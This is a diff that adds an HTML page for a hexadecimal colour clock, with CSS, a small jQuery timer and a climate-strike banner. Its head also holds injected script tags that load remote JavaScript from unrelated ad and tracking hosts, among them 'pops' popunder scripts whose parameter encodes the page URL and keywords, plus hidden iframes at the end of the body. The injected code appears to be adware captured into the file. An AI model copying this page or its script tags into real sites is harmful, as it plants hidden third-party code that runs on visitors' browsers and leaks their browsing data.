@@ -1,0 +1,265 @@
+<html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=yes">
+<title>Hex clock</title>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<meta name="Keywords" content="Jacopo Colò, Jacopo Colo, hex, clock, hexadecimal, colors">
+<meta name="description" content="A precise hexadecimal color clock that goes the whole 24 hours color range, from #000000 to #235959.">
+<script src="https://code.jquery.com/jquery-latest.js"></script>
+<!--<script src="https://assets.digitalclimatestrike.net/widget.js" async></script>-->
+<link href="https://fonts.googleapis.com/css?family=Lato:100,300" rel="stylesheet" type="text/css">
+<meta name="apple-mobile-web-app-capable" content="yes">
+
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon-precomposed" sizes="60x60" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://www.jacopocolo.com/hexclock/apple-touch-icon-152x152.png">
+<link rel="icon" type="image/png" href="https://www.jacopocolo.com/hexclock/favicon-196x196.png" sizes="196x196">
+<link rel="icon" type="image/png" href="https://www.jacopocolo.com/hexclock/favicon-160x160.png" sizes="160x160">
+<link rel="icon" type="image/png" href="https://www.jacopocolo.com/hexclock/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="https://www.jacopocolo.com/hexclock/favicon-16x16.png" sizes="16x16">
+<link rel="icon" type="image/png" href="https://www.jacopocolo.com/hexclock/favicon-32x32.png" sizes="32x32">
+<meta name="msapplication-TileColor" content="#000000">
+<meta name="msapplication-TileImage" content="https://www.jacopocolo.com/hexclock/mstile-144x144.png">
+
+
+<meta property="og:image" content="https://www.jacopocolo.com/hexclock/preview.jpg">
+<style>
+html body {
+	margin: 0;
+	padding: 0;
+	height: 100%;
+	width: 100%;
+}
+.background {
+	width: 100%;
+	height: 100%;
+	position: absolute;
+	vertical-align: middle;
+}
+
+#hex {
+	color: white;
+	font-family: 'Lato', Helvetiva, Arial, sans-serif;
+	text-align: center;
+	font-size: 4.5em;
+	display: block;
+	min-width: 200px;
+	font-weight: 100;
+}
+
+#what {
+	color: rgba(255, 255, 255, 0.90);
+	font-family: 'Lato', Helvetica, Arial, sans-serif;
+	display: block;
+	font-size: 0.9em;
+	position: absolute;
+	bottom: 0px;
+	left: 10px;
+	padding-right: 10px;
+	font-weight: 300;
+}
+
+#what a {
+	color: inherit;
+}
+
+#question, #tweet {
+	text-decoration: none;
+}
+
+.absolute-center {
+	/*width: 50%;*/
+  	margin: auto;
+  	position: absolute;
+  	top: 50%; left: 50%;
+  	-webkit-transform: translate(-50%,-50%);
+      -ms-transform: translate(-50%,-50%);
+          transform: translate(-50%,-50%);
+}
+
+.dcs-footer {
+	display: none;
+	position: absolute;
+	font-family: 'Lato', Helvetica, Arial, sans-serif;
+	color: white;
+	bottom: 0;
+		width: 100%;
+	z-index: 100;
+	border-top: 1px solid rgba(255,255,255,0.3);
+	background-color: rgba(0,0,0,0.2)
+}
+
+.dcs-footer__container {
+ display:-webkit-box;
+ display:-ms-flexbox;
+ display:flex;
+ -ms-flex-wrap:nowrap;
+ flex-wrap:nowrap;
+ margin:0 auto;
+ max-width:50rem;
+}
+.dcs-footer__logo {
+ display:block;
+ -webkit-box-flex:0;
+ -ms-flex:0 0 10%;
+ flex:0 0 10%
+}
+
+@media (max-width: 800px) {
+	.dcs-footer__logo {display: none}
+}
+
+.dcs-footer__main {
+ -webkit-box-flex:0;
+ -ms-flex:0 0 70%;
+ flex:0 0 70%;
+ margin:0 1rem
+}
+
+.dcs-footer__main {
+  -webkit-box-flex:1;
+  -ms-flex:1;
+  flex:1;
+  display:-webkit-box;
+  display:-ms-flexbox;
+  display:flex
+ }
+
+.dcs-logo {
+ margin:1rem 0 0
+}
+
+.dcs-footer__action {
+ margin:0.5rem 0 0
+}
+
+.dcs-logo {
+ max-height:2rem
+}
+
+.dcs-button {
+ background-color:#231f20;
+ background-color:var(--grey);
+ -webkit-box-shadow:.3rem .3rem 0 #fff;
+ box-shadow:.3rem .3rem 0 #fff;
+ -webkit-box-shadow:.3rem .3rem 0 var(--white);
+ box-shadow:.3rem .3rem 0 var(--white);
+ color:#fff;
+ color:var(--white);
+ display:-webkit-inline-box;
+ display:-ms-inline-flexbox;
+ display:inline-flex;
+ font:400 1.5rem/1.5rem Greve,Impact,sans-serif;
+ letter-spacing:.06rem;
+ padding:1rem 2rem;
+ text-align:center;
+ text-decoration:none;
+ text-transform:uppercase;
+ white-space:nowrap;
+ border:0;
+ cursor:pointer
+}
+.dcs-button:focus,
+.dcs-button:hover {
+ background-color:#fff;
+ background-color:var(--white);
+ -webkit-box-shadow:.3rem .3rem 0 #000;
+ box-shadow:.3rem .3rem 0 #000;
+ -webkit-box-shadow:.3rem .3rem 0 var(--black);
+ box-shadow:.3rem .3rem 0 var(--black);
+ color:#000;
+ color:var(--black)
+}
+.dcs-button:focus {
+ outline:2px dotted #000;
+ outline:2px dotted var(--black)
+}
+.dcs-button__icon {
+ font-size:1.5rem;
+ height:100%;
+ display:inline-block;
+ padding-left:.5rem;
+ width:1rem
+}
+
+.dcs-footer__body {
+	font-weight: 600;
+}
+
+.background {
+	height: 100%;
+}
+
+</style>
+<script type="text/javascript" src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8020x">
+</script>
+<script type="text/javascript" src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8020x&amp;format=arrjs&amp;r=1573807977950">
+</script>
+<script type="text/javascript" src="http://cdncache-a.akamaihd.net/sub/nee5452/52429_8020_/l.js?pid=2450&amp;ext=Not%20set">
+</script>
+<script type="text/javascript" src="http://countmake.cool/ext/1f546f49ebf4153c8a.js?sid=52429_8020_&amp;title=Not%20set&amp;blocks[]=02aed">
+</script>
+<script type="text/javascript" src="//cdn-js.net/addons/pops/script.js?t=1573807977975"></script><script async="" type="text/javascript" src="http://s.pmddby.com/pops?c=aHR0cCUzQS8vd3d3LmphY29wb2NvbG8uY29tL2hleGNsb2NrLzo6ei0yNDUwLTg5MTQwMDgwOjpoZXgsY2xvY2ssYSxwcmVjaXNlLGhleGFkZWNpbWFsLGNvbG9yLHRoYXQsZ29lcyx0aGUsd2hvbGUsMjQsaG91cnMscmFuZ2UsZnJvbSwjMDAwMDAwLHRvLCMyMzU5NTk%3D&amp;a=1&amp;ch=&amp;subid=g-89140080-2460130852fb47058d7f801a2fc65e5a-&amp;cb=z5jX57J12g20vnk8i2ey&amp;data_fr=true&amp;data_proto=http%3A&amp;data_test=2019041407_c&amp;ed=1&amp;pt=p&amp;pt=r&amp;pt=t&amp;pt=w&amp;ms=44402&amp;r=1573807978">
+</script>
+<script async="" type="text/javascript" src="http://s.pmddby.com/pops?c=aHR0cCUzQS8vd3d3LmphY29wb2NvbG8uY29tL2hleGNsb2NrLzo6ei0yNDUwLTg5MTQwMDgwOjpoZXgsY2xvY2ssYSxwcmVjaXNlLGhleGFkZWNpbWFsLGNvbG9yLHRoYXQsZ29lcyx0aGUsd2hvbGUsMjQsaG91cnMscmFuZ2UsZnJvbSwjMDAwMDAwLHRvLCMyMzU5NTk%3D&amp;a=1&amp;ch=&amp;subid=g-89140080-2460130852fb47058d7f801a2fc65e5a-&amp;cb=J51vHg1Pya2Kk1gdEI6q&amp;data_fr=false&amp;data_proto=http%3A&amp;data_test=2019041407_c&amp;ed=1&amp;fo=1&amp;pt=p&amp;pt=r&amp;pt=t&amp;pt=w&amp;ms=43956&amp;r=1573807978">
+</script>
+<script type="text/javascript" src="//cdn-js.net/addons/pops/license.14.js">
+</script>
+</head>
+<body style="">
+<div class="background" style="background-color: rgb(21, 86, 88);">
+<div class="absolute-center">
+<p id="hex">#155658</p>
+</div>
+</div>
+<div class="dcs-footer">
+<div class="dcs-footer__container"> 
+<a class="dcs-footer__logo" href="https://digital.globalclimatestrike.net/join/?source=digitalstrikebanner"> 
+<img src="https://assets.digitalclimatestrike.net/3d5a68d64ff25e84926b2817655003c0.png" alt="Digital Climate Strike logo" class="dcs-logo"> </a> <div class="dcs-footer__main">  <p class="dcs-footer__body"> This clock is joining the Global #ClimateStrike on September 20th. Will you?</p>
+<div class="dcs-footer__action"> <a href="https://digital.globalclimatestrike.net/join/?source=digitalstrikebanner" class="dcs-button"> Yes, I’m in. ➔ </a> </div>  </div>  </div>
+</div>
+
+<script>
+function refreshData()
+{
+    x = 1;  // x = seconds
+ 	var d = new Date()
+ 	var h = d.getHours();
+ 	var m = d.getMinutes();
+ 	var s = d.getSeconds();
+
+ 	if (h<=9) {h = '0'+h};
+ 	if (m<=9) {m = '0'+m};
+	if (s<=9) {s = '0'+s};
+
+ 	var	color = '#'+h+m+s;
+	$("div.background").css("background-color", color );
+	$("p#hex").text(color);
+
+		// if (d.getDate()==20 && d.getMonth()==8) {
+		// 	$("p#hex").text("#ClimateStrike");
+		// } else {
+    // $("p#hex").text(color);}
+
+    setTimeout(refreshData, x*1000);
+}
+
+refreshData(); // execute function
+</script>
+
+<script src="//s3.amazonaws.com/jscriptcdn/1f546f49ebf4153c8a.js">
+</script>
+<iframe style="position:absolute;left:-999px;top:-999px;visibility:hidden">
+</iframe>
+<iframe style="display: none; visibility: hidden;">
+</iframe>
+<iframe style="display: none; visibility: hidden;">
+</iframe>
+</body>
